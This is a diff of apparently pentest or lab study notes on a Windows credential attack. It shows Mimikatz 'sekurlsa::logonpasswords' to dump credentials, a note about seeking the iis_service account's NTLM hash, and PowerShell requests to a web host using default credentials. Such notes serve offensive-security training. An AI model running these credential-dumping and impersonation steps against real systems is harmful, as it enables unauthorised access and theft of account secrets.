@@ -16,7 +16,7 @@ sekurlsa::logonpasswords
 ```
 {% endcode %}
 
-* looking for NLTM hashes
+* looking for _iis\_service_ user account NLTM hashes
 {% endstep %}
 
 {% step %}
@@ -54,7 +54,7 @@ sekurlsa::logonpasswords
 ```
 {% endcode %}
 
-* looking for NLTM hashes
+* looking for _iis\_service_ user account NLTM hashes
 
 ### Get SID:
 
@@ -93,3 +93,10 @@ Attempt to access the resource:
 iwr -UseDefaultCredentials http://web04
 ```
 
+view source code:
+
+{% code overflow="wrap" %}
+```powershell
+(Invoke-WebRequest -Uri http://web04 -UseDefaultCredentials).Content
+```
+{% endcode %}
